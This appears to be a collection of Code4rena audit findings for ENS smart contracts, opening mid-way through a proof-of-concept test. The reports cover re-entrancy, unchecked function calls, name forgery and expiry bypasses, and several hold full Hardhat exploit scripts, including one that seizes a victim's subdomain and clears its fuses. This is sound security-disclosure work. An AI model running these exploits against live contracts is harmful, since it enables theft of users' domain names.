CAN_DO_EVERYTHING,         MAX_EXPIRY       )       expect(await BaseRegistrar.ownerOf(labelHash)).to.equal(         NameWrapper.address       )       expect(await EnsRegistry.owner(wrappedTokenId)).to.equal(         NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedTokenId)).to.equal(dev)        // signed a submomain for the hacker       const subLabel = 'hack'       const subLabelHash = labelhash(subLabel)       const subDomain = subLabel + '.' + label + '.eth'       const wrappedSubTokenId = namehash(subDomain)       await NameWrapper.setSubnodeOwner(         wrappedTokenId,         subLabel,         hacker,         PARENT_CANNOT_CONTROL,         MAX_EXPIRY       )       expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(           NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedSubTokenId)).to.equal(hacker)       expect(           (await NameWrapper.getFuses(wrappedSubTokenId))[0]       ).to.equal(PARENT_CANNOT_CONTROL)        // hacker signed a subsubmomain for a victim user       const subSubLabel = 'victim'       const subSubLabelHash = labelhash(subSubLabel)       const subSubDomain = subSubLabel + '.' + subDomain       const wrappedSubSubTokenId = namehash(subSubDomain)       await NameWrapperH.setSubnodeOwner(         wrappedSubTokenId,         subSubLabel,         victim,         PARENT_CANNOT_CONTROL,         MAX_EXPIRY       )       expect(await EnsRegistry.owner(wrappedSubSubTokenId)).to.equal(           NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedSubSubTokenId)).to.equal(victim)       expect(           (await NameWrapper.getFuses(wrappedSubSubTokenId))[0]       ).to.equal(PARENT_CANNOT_CONTROL)        // the user sets a very strict fuse for the wrappedSubSubTokenId       await NameWrapperV.setFuses(wrappedSubSubTokenId, 127 - PARENT_CANNOT_CONTROL) // 63       expect((await NameWrapper.getFuses(wrappedSubSubTokenId))[0]).to.equal(127)        // the hacker unwraps his wrappedSubTokenId       await NameWrapperH.unwrap(wrappedTokenId, subLabelHash, hacker)       expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(hacker)        // the hacker setSubnodeOwner, to set the owner of wrappedSubSubTokenId as himself       await EnsRegistryH.setSubnodeOwner(wrappedSubTokenId, subSubLabelHash, hacker)       expect(await EnsRegistry.owner(wrappedSubSubTokenId)).to.equal(hacker)          // the hacker re-wrap the sub sub node       await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)       await NameWrapperH.wrap(encodeName(subSubDomain), hacker, EMPTY_ADDRESS)        // ///////////////////////////       // // Attack successed!       // ///////////////////////////        // XXX: [1] the owner of wrappedSubTokenId transfer from the victim to the hacker       // XXX: [2] the fuses of wrappedSubTokenId becomes 0 from full-protected       expect(await NameWrapper.ownerOf(wrappedSubSubTokenId)).to.equal(hacker)       expect((await NameWrapper.getFuses(wrappedSubSubTokenId))[0]).to.equal(0)     })   }) }) ```  
# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L327-L346   # Vulnerability details  ### Impact  The `unwrapETH2LD` use `transferFrom` to transfer ERC721 token, the `newRegistrant` could be an unprepared contract  ### Proof of Concept  Should a ERC-721 compatible token be transferred to an unprepared contract, it would end up being locked up there. Moreover, if a contract explicitly wanted to reject ERC-721 safeTransfers. Plus take a look to [the OZ safeTransfer comments](https://docs.openzeppelin.com/contracts/4.x/api/token/erc721#IERC721-transferFrom-address-address-uint256-);   `Usage of this method is discouraged, use safeTransferFrom whenever possible.`  ### Tools Used  Manual Review  ### Recommended Mitigation Steps  ```diff     function unwrapETH2LD(         bytes32 labelhash,         address newRegistrant,         address newController     ) public override onlyTokenOwner(_makeNode(ETH_NODE, labelhash)) {         _unwrap(_makeNode(ETH_NODE, labelhash), newController); -       registrar.transferFrom( +       registrar.safeTransferFrom(             address(this),             newRegistrant,             uint256(labelhash)         );     } ```  
# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/ETHRegistrarController.sol#L183-L185 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/ETHRegistrarController.sol#L204   # Vulnerability details  ## Impact `transfer()` forwards 2300 gas only, which may not be enough in future if the recipient is a contract and gas costs change. it could break existing contracts functionality.  ## Proof of Concept `.transfer` or `.send` method, only 2300 gas will be “forwarded” to fallback function. Specifically, the SLOAD instruction, will go from costing 200 gas to 800 gas.  if any smart contract has a functionality of register ens and it has fallback function which is making some state change in contract on ether receive, it could use more than 2300 gas and revert every transaction  for reference checkout this, https://docs.soliditylang.org/en/v0.8.15/security-considerations.html?highlight=transfer#sending-and-receiving-ether https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/  ## Tools Used Manual Analysis  ## Recommended Mitigation Steps  use `.call` insted `.transfer`       (bool success, ) = msg.sender.call.value(amount)("");      require(success, "Transfer failed.");   
# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/ETHRegistrarController.sol#L249-L268 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/ETHRegistrarController.sol#L125 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/BaseRegistrarImplementation.sol#L106   # Vulnerability details  ## Impact Users using the ```register``` function in ```ETHRegistrarController.sol```, can create an additional bogus ENS entry (Keep the ERC721 and all the glory for as long as they want) for free by exploiting the ```functionCall``` in the ```_setRecords``` function. The only check there (in the setRecord function) is that the nodehash matches the originally registered ENS entry, this is extremely dangerous because the rest of the functionCall is not checked and the controller has very elevated privileges in ENS ecosystem (and probably beyond).  The single exploit I am showing is already very bad, but I expect there will be more if this is left in. An example of a potential hack is that some of the functions in other ENS contracts (which give the RegistrarController elevated privilege) have dynamic types as the first variables--if users can generate a hash that is a low enough number, they will be able to unlock more exploits in the ENS ecosystem because of how dynamic types are abi encoded.  Other developers will probably also trust the ```ETHRegistrarController.sol```, so other unknown dangers may come down the road.  The exploit I made (full code in PoC) can mint another ENS entry and keep it for as long as it wants, without paying more--will show code below.  ## Proof of Concept Put this code in the ```TestEthRegistrarController.js``` test suite to run. I just appended this to tests at the bottom of file.   I called the ```BaseRegistrarImplementation.register``` function with the privileges of ```ETHRegistrarController``` by passing the base registrar's address as the ```resolver``` param in the ```ETHRegistrarController.register``` function call. I was able to set a custom duration at no additional cost.   The final checks of the PoC show that we own two new ENS entries from a single ```ETHRegistrarController.register``` call. The labelhash of the new bogus ENS entry is the nodehash of the first registered ENS entry.  ```js   it('Should allow us to make bogus erc721 token in ENS contract', async () => {     const label = 'newconfigname'     const name = `${label}.eth`     const node = namehash.hash(name)     const secondTokenDuration = 788400000 // keep bogus NFT for 25 years;      var commitment = await controller.makeCommitment(       label,       registrantAccount,       REGISTRATION_TIME,       secret,       baseRegistrar.address,       [         baseRegistrar.interface.encodeFunctionData('register(uint256,address,uint)', [           node,           registrantAccount,           secondTokenDuration         ]),       ],       false,       0,       0     )     var tx = await controller.commit(commitment)     expect(await controller.commitments(commitment)).to.equal(       (await web3.eth.getBlock(tx.blockNumber)).timestamp     )      await evm.advanceTime((await controller.minCommitmentAge()).toNumber())     var balanceBefore = await web3.eth.getBalance(controller.address)      let tx2 = await controller.register(       label,       registrantAccount,       REGISTRATION_TIME,       secret,       baseRegistrar.address,       [         baseRegistrar.interface.encodeFunctionData('register(uint256,address,uint)', [           node,           registrantAccount,           secondTokenDuration         ]),       ],       false,       0,       0,       { value: BUFFERED_REGISTRATION_COST }     )      expect(await nameWrapper.ownerOf(node)).to.equal(registrantAccount)     expect(await ens.owner(namehash.hash(name))).to.equal(nameWrapper.address)       expect(await baseRegistrar.ownerOf(node)).to.equal( // this checks that bogus NFT is owned by us       registrantAccount     )     expect(await baseRegistrar.ownerOf(sha3(label))).to.equal(       nameWrapper.address     )   }) ```  ## Tools Used chai tests in repo  ## Recommended Mitigation Steps I recommend being stricter on the signatures of the user-provided ```resolver``` and the function that is being called (like safeTransfer calls in existing token contracts). An example of how to do this is by creating an interface that ENS can publish for users that want to compose their own resolvers and call that instead of a loose functionCall. Users will be free to handle data however they like, while restricting the space of things that can go wrong.  I will provide a loose example here: ``` interface IUserResolver {     function registerRecords(bytes32 nodeId, bytes32 labelHash, bytes calldata extraData)  } ```  
# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L820-L821 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L524 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L572   # Vulnerability details  ## Impact  Due to re-entrancy possibility in `NameWrapper._transferAndBurnFuses` (called from `setSubnodeOwner` and `setSubnodeRecord`), it is possible to do some stuff in `onERC1155Received` right after transfer but before new owner and new fuses are set. This makes it possible, for example, to unwrap the subdomain, but owner and fuses will still be set even for unwrapped domain, creating fake `ERC1155` `NameWrapper` token for domain, which is not owned by `NameWrapper`.  Fake token creation scenario:  1. `Account1` registers and wraps `test.eth` domain 2. `Account1` calls `NameWrapper.setSubnodeOwner` for `sub.test.eth` subdomain with `Account1` as owner (to make NameWrapper owner of subdomain) 3. `Contract1` smart contract is created, which calls unwrap in its `onERC1155Received` function, and a function to send `sub.test.eth` ERC1155 NameWrapper token back to `Account1` 4. `Account1` calls `NameWrapper.setSubnodeOwner` for `sub.test.eth` with `Contract1` as new owner, which unwraps domain back to `Account1` but due to re-entrancy, NameWrapper sets fuses and ownership to `Contract1` 5. `Account1` calls function to send ERC1155 token from `Contract1` back to self.  After this sequence of events, `sub.test.eth` subdomain is owned by `Account1` both in `ENS` registry and in `NameWrapper` (with fuses and expiry correctly set to the future date). Lots (but not all) of functions in `NameWrapper` will fail to execute for this subdomain, because they expect `NameWrapper` to have ownership of the domain in `ENS`, but some functions will still work, making it possible to make the impression of good domain.  At this point, ownership in `NameWrapper` is "detached" from ownership in `ENS` and `Account1` can do all kinds of malcious stuff with its ERC1155 token. For example:  1. Sell subdomain to the other user, transfering `ERC1155` to that user and burning `PARENT_CANNOT_CONTROL` to create impression that he can't control the domain. After receiving the payment, `Account1` can wrap the domain again, which burns existing ownership record and replaces with the new one with clear fuses and `Account1` ownership, effectively stealing domain back from unsuspecting user, who thought that `ERC1155` gives him the right to the domain (and didn't expect that parent can clear fuses when `PARENT_CANNOT_CONTROL` is set).  2. Transfer subdomain to some other smart contract, which implements `onERC1155Received`, then take it back, fooling smart contract into believing that it has received the domain.   ## Proof of Concept  Copy these to test/wrapper and run: yarn test test/wrapper/NameWrapperReentrancy.js  https://gist.github.com/panprog/3cd94e3fbb0c52410a4c6609e55b863e   ## Recommended Mitigation Steps  Consider adding `nonReentrant` modifiers with `ReentrancyGuard` implementation from `openzeppelin`. Alternatively just fix this individual re-entrancy issue. There are multiple ways to fix it depending on expected behaviour, for example saving `ERC1155` data and requiring it to match the data after transfer (restricting `onERC1155Received` to not change any data for the token received):      function _transferAndBurnFuses(         bytes32 node,         address newOwner,         uint32 fuses,         uint64 expiry     ) internal {         (address owner, uint32 saveFuses, uint64 saveExpiry) = getData(uint256(node));         _transfer(owner, newOwner, uint256(node), 1, "");         uint32 curFuses;         uint64 curExpiry;         (owner, curFuses, curExpiry) = getData(uint256(node));         require(owner == newOwner && saveFuses == curFuses && saveExpiry == curExpiry);         _setFuses(node, newOwner, fuses, expiry);     }   
# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L520   # Vulnerability details  ### Description  By design, the `NameWrapper.names` is used as a preimage DB so that the client can query the domain name by providing the token ID. The name should be correctly stored. To do so, the `NameWrapper` record the domain's name every time it gets wrapped. And as long as all the parent nodes are recorded in the DB, wrapping a child node will be very efficient by simply querying the parent node's name.  However, within a malicious scenario, it is possible that a subdomain can be wrapped without recording its info in the preimage DB.  Specifically, when `NameWrappper.setSubnodeOwner` / `NameWrappper.setSubnodeRecord` on a given subdomain, the following code is used to check whether the subdomain is wrapped or not. The preimage DB is only updated when the subdomain is not wrapped (to save gas I beieve).  ```solidity= function setSubnodeOwner(     bytes32 parentNode,     string calldata label,     address newOwner,     uint32 fuses,     uint64 expiry )     public     onlyTokenOwner(parentNode)     canCallSetSubnodeOwner(parentNode, keccak256(bytes(label)))     returns (bytes32 node) {     bytes32 labelhash = keccak256(bytes(label));     node = _makeNode(parentNode, labelhash);     (, , expiry) = _getDataAndNormaliseExpiry(parentNode, node, expiry);     if (ens.owner(node) != address(this)) {         ens.setSubnodeOwner(parentNode, labelhash, address(this));         _addLabelAndWrap(parentNode, node, label, newOwner, fuses, expiry);     } else {         _transferAndBurnFuses(node, newOwner, fuses, expiry);     } } ```  However, the problem is that `ens.owner(node) != address(this)` is not sufficient to check whether the node is alreay wrapped. The hacker can manipulate this check by simply invoking `EnsRegistry.setSubnodeOwner` to set the owner as the `NameWrapper` contract without wrapping the node.  Consider the following attack scenario.  + the hacker registers a 2LD domain, e.g., `base.eth` + he assigns a subdomain for himself, e.g., `sub1.base.eth`      + the expiry of `sub1.base.eth` should be set as expired shortly      + note that the expiry is for `sub1.base.eth` instead of `base.eth`, so it is safe to make it soonly expired + the hacker waits for expiration and unwraps his `sub1.base.eth` + the hacker invokes `ens.setSubnodeOwner` to set the owner of `sub2.sub1.base.eth` as NameWrapper contract + the hacker re-wraps his `sub1.base.eth` + the hacker invokes `nameWrapper.setSubnodeOwner` for `sub2.sub1.base.eth`      + as such, `names[namehash(sub2.sub1.base.eth)]` becomes empty  + the hacker invokes `nameWrapper.setSubnodeOwner` for `eth.sub2.sub1.base.eth`.      + as such, `names[namehash(eth.sub2.sub1.base.eth)]` becomes `\x03eth`  It is not rated as a High issue since the forged name is not valid, i.e., without the tailed `\x00` (note that a valid name should be like `\x03eth\x00`). However, the preimage BD can still be corrupted due to this issue.  ### Notes  Discussed with the project member, Jeff Lau.   If there is any issue running the attached PoC code, please contact me via `izhuer#0001` discord.   ### Suggested Fix  When wrapping node `X`, check whether `NameWrapper.names[X]` is empty directly, and update the preimage DB if it is empty.  ### PoC / Attack Scenario  There is a PoC file named `poc3.js`  To run the PoC, put then in `2022-07-ens/test/wrapper` and run `npx hardhat test --grep 'PoC'`.   #### poc3.js ```javascript= const packet = require('dns-packet') const { ethers } = require('hardhat') const { utils } = ethers const { use, expect } = require('chai') const { solidity } = require('ethereum-waffle') const n = require('eth-ens-namehash') const provider = ethers.provider const namehash = n.hash const { evm } = require('../test-utils') const { deploy } = require('../test-utils/contracts') const { keccak256 } = require('ethers/lib/utils')  use(solidity)  const labelhash = (label) => utils.keccak256(utils.toUtf8Bytes(label)) const ROOT_NODE =   '0x0000000000000000000000000000000000000000000000000000000000000000'  const EMPTY_ADDRESS = '0x0000000000000000000000000000000000000000'  function encodeName(name) {   return '0x' + packet.name.encode(name).toString('hex') }  const CANNOT_UNWRAP = 1 const CANNOT_BURN_FUSES = 2 const CANNOT_TRANSFER = 4 const CANNOT_SET_RESOLVER = 8 const CANNOT_SET_TTL = 16 const CANNOT_CREATE_SUBDOMAIN = 32 const PARENT_CANNOT_CONTROL = 64 const CAN_DO_EVERYTHING = 0  describe('PoC 3', () => {   let ENSRegistry   let BaseRegistrar   let NameWrapper   let NameWrapperV   let MetaDataservice   let signers   let dev   let victim   let hacker   let result   let MAX_EXPIRY = 2n ** 64n - 1n    before(async () => {     signers = await ethers.getSigners()     dev = await signers[0].getAddress()     victim = await signers[1].getAddress()     hacker = await signers[2].getAddress()      EnsRegistry = await deploy('ENSRegistry')     EnsRegistryV = EnsRegistry.connect(signers[1])     EnsRegistryH = EnsRegistry.connect(signers[2])      BaseRegistrar = await deploy(       'BaseRegistrarImplementation',       EnsRegistry.address,       namehash('eth')     )      await BaseRegistrar.addController(dev)     await BaseRegistrar.addController(victim)      MetaDataservice = await deploy(       'StaticMetadataService',       'https://ens.domains'     )      NameWrapper = await deploy(       'NameWrapper',       EnsRegistry.address,       BaseRegistrar.address,       MetaDataservice.address     )     NameWrapperV = NameWrapper.connect(signers[1])     NameWrapperH = NameWrapper.connect(signers[2])      // setup .eth     await EnsRegistry.setSubnodeOwner(       ROOT_NODE,       labelhash('eth'),       BaseRegistrar.address     )      //make sure base registrar is owner of eth TLD     expect(await EnsRegistry.owner(namehash('eth'))).to.equal(       BaseRegistrar.address     )   })    beforeEach(async () => {     result = await ethers.provider.send('evm_snapshot')   })   afterEach(async () => {     await ethers.provider.send('evm_revert', [result])   })    describe('name of a subdomain can be forged', () => {     /*      * Attack scenario:      * 1. the hacker registers a 2LD domain, e.g., base.eth      *      * 2. he assigns a subdomain for himself, e.g., sub1.base.eth      *      + the expiry of sub1.base.eth should be set as expired shortly      *      + note that the expiry is for sub1.base.eth not base.eth, so it is safe to make it soonly expired      *      * 3. the hacker waits for expiration and unwraps his sub1.base.eth      *      * 4. the hacker invokes ens.setSubnodeOwner to set the owner of sub2.sub1.base.eth as NameWrapper contract      *      * 5. the hacker re-wraps his sub1.base.eth      *      * 6. the hacker invokes nameWrapper.setSubnodeOwner for sub2.sub1.base.eth      *      + as such, `names[namehash(sub2.sub1.base.eth)]` becomes empty      *      * 7. the hacker invokes nameWrapper.setSubnodeOwner for eht.sub2.sub1.base.eth.      *      + as such, `names[namehash(eth.sub2.sub1.base.eth)]` becomes \03eth      */     before(async () => {       await BaseRegistrar.addController(NameWrapper.address)       await NameWrapper.setController(dev, true)     })      it('a passed test denotes a successful attack', async () => {       const label = 'base'       const labelHash = labelhash(label)       const wrappedTokenId = namehash(label + '.eth')        // registers a 2LD domain       await NameWrapper.registerAndWrapETH2LD(         label,         hacker,         86400,         EMPTY_ADDRESS,         PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,         MAX_EXPIRY       )       expect(await BaseRegistrar.ownerOf(labelHash)).to.equal(         NameWrapper.address       )       expect(await EnsRegistry.owner(wrappedTokenId)).to.equal(         NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedTokenId)).to.equal(hacker)        // signed a submomain for the hacker, with a soon-expired expiry       const sub1Label = 'sub1'       const sub1LabelHash = labelhash(sub1Label)       const sub1Domain = sub1Label + '.' + label + '.eth'  // sub1.base.eth       const wrappedSub1TokenId = namehash(sub1Domain)       const block = await provider.getBlock(await provider.getBlockNumber())       await NameWrapperH.setSubnodeOwner(         wrappedTokenId,         sub1Label,         hacker,         PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,         block.timestamp + 3600 // soonly expired       )       expect(await EnsRegistry.owner(wrappedSub1TokenId)).to.equal(           NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedSub1TokenId)).to.equal(hacker)       expect(           (await NameWrapper.getFuses(wrappedSub1TokenId))[0]       ).to.equal(PARENT_CANNOT_CONTROL | CANNOT_UNWRAP)        // the hacker unwraps his wrappedSubTokenId       await evm.advanceTime(7200)       await NameWrapperH.unwrap(wrappedTokenId, sub1LabelHash, hacker)       expect(await EnsRegistry.owner(wrappedSub1TokenId)).to.equal(hacker)        // the hacker setSubnodeOwner, to set the owner of wrappedSub2TokenId as NameWrapper       const sub2Label = 'sub2'       const sub2LabelHash = labelhash(sub2Label)       const sub2Domain = sub2Label + '.' + sub1Domain // sub2.sub1.base.eth       const wrappedSub2TokenId = namehash(sub2Domain)       await EnsRegistryH.setSubnodeOwner(           wrappedSub1TokenId,           sub2LabelHash,           NameWrapper.address       )       expect(await EnsRegistry.owner(wrappedSub2TokenId)).to.equal(           NameWrapper.address       )        // the hacker re-wraps the sub1node       await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)       await NameWrapperH.wrap(encodeName(sub1Domain), hacker, EMPTY_ADDRESS)       expect(await NameWrapper.ownerOf(wrappedSub1TokenId)).to.equal(hacker)        // the hackers setSubnodeOwner       // XXX: till now, the hacker gets sub2Domain with no name in Namewrapper       await NameWrapperH.setSubnodeOwner(         wrappedSub1TokenId,         sub2Label,         hacker,         PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,         MAX_EXPIRY       )       expect(await NameWrapper.ownerOf(wrappedSub2TokenId)).to.equal(hacker)       expect(await NameWrapper.names(wrappedSub2TokenId)).to.equal('0x')        // the hacker forge a fake root node       const sub3Label = 'eth'       const sub3LabelHash = labelhash(sub3Label)       const sub3Domain = sub3Label + '.' + sub2Domain // eth.sub2.sub1.base.eth       const wrappedSub3TokenId = namehash(sub3Domain)       await NameWrapperH.setSubnodeOwner(         wrappedSub2TokenId,         sub3Label,         hacker,         PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,         MAX_EXPIRY       )       expect(await NameWrapper.ownerOf(wrappedSub3TokenId)).to.equal(hacker)        // ///////////////////////////       // // Attack successed!       // ///////////////////////////        // XXX: names[wrappedSub3TokenId] becomes `\x03eth`       expect(await NameWrapper.names(wrappedSub3TokenId)).to.equal('0x03657468') // \03eth     })   }) }) ```  
# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L504 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L356   # Vulnerability details  ### Description  By design, the child node's expiry can only be extended up to the parent's current one. Adding these restrictions means that the ENS users only have to look at the name itself's fuses and expiry (without traversing the hierarchy) to understand what guarantees the users have.  When a parent node tries to `setSubnodeOwner` / `setSubnodeRecord`, the following code is used to guarantee that the new expiry can only be extended up to the current one.  ```solidity= function _getDataAndNormaliseExpiry(     bytes32 parentNode,     bytes32 node,     uint64 expiry )     internal     view     returns (         address owner,         uint32 fuses,         uint64     ) {     uint64 oldExpiry;     (owner, fuses, oldExpiry) = getData(uint256(node));     (, , uint64 maxExpiry) = getData(uint256(parentNode));     expiry = _normaliseExpiry(expiry, oldExpiry, maxExpiry);     return (owner, fuses, expiry); } ```  However, the problem shows when   + The sub-domain (e.g., `sub1.base.eth`) has its own sub-sub-domain (e.g., `sub2.sub1.base.eth`) + The sub-domain is unwrapped later, and thus its `oldExpiry` becomes zero. + When `base.eth` calls `NameWrapper.setSubnodeOwner`, there is not constraint of `sub1.base.eth`'s expiry, since `oldExpiry == 0`. As a result, the new expiry of `sub1.base.eth` can be arbitrary and smaller than the one of `sub2.sub1.base.eth`  The point here is that the `oldExpiry` will be set as 0 when unwrapping the node even it holds child nodes, relaxing the constraint.  Specifically, considering the following scenario  + The hacker owns a domain (or a 2LD), e.g., `base.eth` + The hacker assigns a sub-domain to himself, e.g., `sub1.base.eth`     + The expiry should be as large as possible + Hacker assigns a sub-sub-domain, e.g., `sub2.sub1.base.eth`     + The expiry should be as large as possible + The hacker unwraps his sub-domain, i.e., `sub1.base.eth` + The hacker re-wraps his sub-domain via `NameWrapper.setSubnodeOwner`     + The expiry can be small than the one of sub2.sub1.base.eth      The root cause _seems_ that we should not zero out the expiry when burning a node if the node holds any subnode.  ### Notes  Discussed with the project member, Jeff Lau.   If there is any issue running the attached PoC code, please contact me via `izhuer#0001` discord.   ### Suggested Fix  + Potential fix 1: auto-burn `CANNOT_UNWRAP` which thus lets `expiry` decide whether a node can be unwrapped. + Potential fix 2: force the parent to have `CANNOT_UNWRAP` burnt if they want to set expiries on a child via `setSubnodeOwner` / `setSubnodeRecord` / `setChildFuses`  ### PoC / Attack Scenario  There is a PoC file named `poc5.js`  To run the PoC, put then in `2022-07-ens/test/wrapper` and run `npx hardhat test --grep 'PoC'`.   #### poc5.js  ```javascript= const packet = require('dns-packet') const { ethers } = require('hardhat') const { utils } = ethers const { use, expect } = require('chai') const { solidity } = require('ethereum-waffle') const n = require('eth-ens-namehash') const provider = ethers.provider const namehash = n.hash const { deploy } = require('../test-utils/contracts') const { keccak256 } = require('ethers/lib/utils')  use(solidity)  const labelhash = (label) => utils.keccak256(utils.toUtf8Bytes(label)) const ROOT_NODE =   '0x0000000000000000000000000000000000000000000000000000000000000000'  const EMPTY_ADDRESS = '0x0000000000000000000000000000000000000000'  function encodeName(name) {   return '0x' + packet.name.encode(name).toString('hex') }  const CANNOT_UNWRAP = 1 const CANNOT_BURN_FUSES = 2 const CANNOT_TRANSFER = 4 const CANNOT_SET_RESOLVER = 8 const CANNOT_SET_TTL = 16 const CANNOT_CREATE_SUBDOMAIN = 32 const PARENT_CANNOT_CONTROL = 64 const CAN_DO_EVERYTHING = 0  describe('PoC 5', () => {   let ENSRegistry   let BaseRegistrar   let NameWrapper   let NameWrapperV   let MetaDataservice   let signers   let dev   let victim   let hacker   let result   let MAX_EXPIRY = 2n ** 64n - 1n    before(async () => {     signers = await ethers.getSigners()     dev = await signers[0].getAddress()     victim = await signers[1].getAddress()     hacker = await signers[2].getAddress()      EnsRegistry = await deploy('ENSRegistry')     EnsRegistryV = EnsRegistry.connect(signers[1])     EnsRegistryH = EnsRegistry.connect(signers[2])      BaseRegistrar = await deploy(       'BaseRegistrarImplementation',       EnsRegistry.address,       namehash('eth')     )      await BaseRegistrar.addController(dev)     await BaseRegistrar.addController(victim)      MetaDataservice = await deploy(       'StaticMetadataService',       'https://ens.domains'     )      NameWrapper = await deploy(       'NameWrapper',       EnsRegistry.address,       BaseRegistrar.address,       MetaDataservice.address     )     NameWrapperV = NameWrapper.connect(signers[1])     NameWrapperH = NameWrapper.connect(signers[2])      // setup .eth     await EnsRegistry.setSubnodeOwner(       ROOT_NODE,       labelhash('eth'),       BaseRegistrar.address     )      //make sure base registrar is owner of eth TLD     expect(await EnsRegistry.owner(namehash('eth'))).to.equal(       BaseRegistrar.address     )   })    beforeEach(async () => {     result = await ethers.provider.send('evm_snapshot')   })   afterEach(async () => {     await ethers.provider.send('evm_revert', [result])   })    describe('subdomain can be re-wrapped', () => {     /*      * Attack scenario:      *  + The hacker owns a domain (or a 2LD), e.g., base.eth      *  + The hacker assigns a sub-domain to himself, e.g., sub1.base.eth      *      + The expiry should be as large as possible      *  + Hacker assigns a sub-sub-domain, e.g., sub2.sub1.base.eth      *      + The expiry should be as large as possible      *  + The hacker unwraps his sub-domain, i.e., sub1.base.eth      *  + The hacker re-wraps his sub-domain, i.e., sub1.base.eth      *      + The expiry can be small than the one of sub2.sub1.base.eth      */     before(async () => {       await BaseRegistrar.addController(NameWrapper.address)       await NameWrapper.setController(dev, true)     })      it('a passed test denotes a successful attack', async () => {       const label = 'base'       const labelHash = labelhash(label)       const wrappedTokenId = namehash(label + '.eth')        // register a 2LD domain       await NameWrapper.registerAndWrapETH2LD(         label,         hacker,         86400,         EMPTY_ADDRESS,         CAN_DO_EVERYTHING,         MAX_EXPIRY       )       const block = await provider.getBlock(await provider.getBlockNumber())       const expiry = block.timestamp + 86400       expect(await BaseRegistrar.ownerOf(labelHash)).to.equal(         NameWrapper.address       )       expect(await EnsRegistry.owner(wrappedTokenId)).to.equal(         NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedTokenId)).to.equal(hacker)       expect(           (await NameWrapper.getFuses(wrappedTokenId))[1]       ).to.equal(expiry)        // assign a submomain       const subLabel = 'sub1'       const subLabelHash = labelhash(subLabel)       const subDomain = subLabel + '.' + label + '.eth'       const wrappedSubTokenId = namehash(subDomain)       await NameWrapperH.setSubnodeOwner(         wrappedTokenId,         subLabel,         hacker,         PARENT_CANNOT_CONTROL,         MAX_EXPIRY       )       expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(           NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedSubTokenId)).to.equal(hacker)       expect(           (await NameWrapper.getFuses(wrappedSubTokenId))[1]       ).to.equal(expiry)        // assign a subsubmomain       const subSubLabel = 'sub2'       const subSubLabelHash = labelhash(subSubLabel)       const subSubDomain = subSubLabel + '.' + subDomain       const wrappedSubSubTokenId = namehash(subSubDomain)       await NameWrapperH.setSubnodeOwner(         wrappedSubTokenId,         subSubLabel,         hacker,         PARENT_CANNOT_CONTROL,         MAX_EXPIRY       )       expect(await EnsRegistry.owner(wrappedSubSubTokenId)).to.equal(           NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedSubSubTokenId)).to.equal(hacker)       expect(           (await NameWrapper.getFuses(wrappedSubSubTokenId))[1]       ).to.equal(expiry)        // the hacker unwraps his wrappedSubTokenId       await NameWrapperH.unwrap(wrappedTokenId, subLabelHash, hacker)       expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(hacker)        // the hacker re-wrap his wrappedSubTokenId by NameWrapper.setSubnodeOwner       await NameWrapperH.setSubnodeOwner(         wrappedTokenId,         subLabel,         hacker,         PARENT_CANNOT_CONTROL,         expiry - 7200       )       expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(           NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedSubTokenId)).to.equal(hacker)        ///////////////////////////       // Attack successed!       ///////////////////////////        // XXX: the expiry of sub1.base.eth is smaller than the one of sub2.sub1.base.eth       const sub1_expiry = (await NameWrapper.getFuses(wrappedSubTokenId))[1]       const sub2_expiry = (await NameWrapper.getFuses(wrappedSubSubTokenId))[1]       console.log('sub1 expiry:', sub1_expiry)       console.log('sub2 expiry:', sub2_expiry)       expect(sub1_expiry.toNumber()).to.be.lessThan(sub2_expiry.toNumber())     })   }) }) ```  
